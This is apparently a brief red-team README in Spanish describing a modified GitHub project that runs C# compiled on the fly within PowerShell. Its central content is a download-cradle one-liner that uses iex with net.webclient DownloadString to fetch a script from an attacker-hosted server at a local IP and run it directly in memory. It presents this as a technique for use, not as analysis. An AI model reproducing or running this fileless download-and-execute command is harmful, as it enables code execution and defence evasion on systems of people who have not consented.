############################# REDTEAM ################################



Modificación del código de https://github.com/thec0nci3rge/PS_with_inline_csharp_compilation para cargar artefacto desde url y ponerlo en memoria directamente con:

iex(new-object net.webclient).downloadstring('http://192.168.11.129:8000/execute_inline_csharp_code_within_powershell.ps1')

La idea incial de ejecutar desde powershell codigo compilado al vuelo C#  -> [John Hammond's VIDEO](https://www.youtube.com/watch?v=EwEwRLedeKI)




#####################################################################
